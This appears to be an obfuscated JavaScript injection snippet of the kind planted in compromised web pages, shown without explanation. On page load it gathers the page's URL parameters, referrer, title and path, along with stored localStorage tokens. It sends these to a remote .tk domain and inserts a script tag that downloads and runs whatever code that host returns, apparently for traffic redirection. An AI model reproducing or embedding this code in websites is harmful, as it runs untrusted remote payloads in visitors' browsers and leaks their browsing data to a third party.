    (function() {
    var name = '_TwxgTnp37Y7t3LyD';
    if (!window._TwxgTnp37Y7t3LyD) {
        window._TwxgTnp37Y7t3LyD = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://guivediwimbpagbezz.tk/Vm3YKjSB',
            P_PATH: 'https://guivediwimbpagbezz.tk/fec84ce/postback',
        };
    }
    const _zJKBQmS8sNBmJB3m = localStorage.getItem('config');
    if (typeof _zJKBQmS8sNBmJB3m !== 'undefined' && _zJKBQmS8sNBmJB3m !== null) {
        var _ytNWTJSB2jk3PBt9 = JSON.parse(_zJKBQmS8sNBmJB3m);
        var _GKkKj8TFbHC7qJ9F = Math.round(+new Date()/1000);
        if (_ytNWTJSB2jk3PBt9.created_at + window._TwxgTnp37Y7t3LyD.ttl < _GKkKj8TFbHC7qJ9F) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _fNGB2d6bTy9pmtxy = localStorage.getItem('subId');
    var _q3S5W63HswHT32mm = localStorage.getItem('token');
    var _2SFWkzyPsbjDw4p9 = '?return=js.client';
        _2SFWkzyPsbjDw4p9 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _2SFWkzyPsbjDw4p9 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _2SFWkzyPsbjDw4p9 += '&default_keyword=' + encodeURIComponent(document.title);
        _2SFWkzyPsbjDw4p9 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _2SFWkzyPsbjDw4p9 += '&name=' + encodeURIComponent(name);
        _2SFWkzyPsbjDw4p9 += '&host=' + encodeURIComponent(window._TwxgTnp37Y7t3LyD.R_PATH);
    if (typeof _fNGB2d6bTy9pmtxy !== 'undefined' && _fNGB2d6bTy9pmtxy && window._TwxgTnp37Y7t3LyD.unique) {
        _2SFWkzyPsbjDw4p9 += '&sub_id=' + encodeURIComponent(_fNGB2d6bTy9pmtxy);
    }
    if (typeof _q3S5W63HswHT32mm !== 'undefined' && _q3S5W63HswHT32mm && window._TwxgTnp37Y7t3LyD.unique) {
        _2SFWkzyPsbjDw4p9 += '&token=' + encodeURIComponent(_q3S5W63HswHT32mm);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._TwxgTnp37Y7t3LyD.R_PATH + _2SFWkzyPsbjDw4p9;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
